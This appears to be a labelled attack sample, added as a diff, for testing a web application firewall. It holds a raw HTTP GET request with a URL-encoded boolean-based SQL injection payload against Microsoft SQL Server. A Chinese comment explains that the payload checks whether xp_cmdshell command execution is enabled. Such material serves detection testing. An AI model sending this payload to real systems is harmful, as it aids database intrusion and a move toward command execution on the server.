@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_布尔注入-06506441
+# 攻击者基于布尔查询，将"(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')"语句注入到 SQL 查询参数中，目的是判断xp_cmdshell是否启用。
+GET /?id=1%20and%201=%28select%20count%28%2A%29%20from%20master.dbo.sysobjects%20where%20xtype%20=%20%27x%27%20and%20name%20=%20%27xp_cmdshell%27%29&bid=hd_tag_m8mv26n5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26n5
+RM-PRO-Token: 9a07b3c2ca3b15a36e70781eb5330b4a
+RM-PRO-Time: 1742808639162
+User-Agent: curl/7.83.1
+
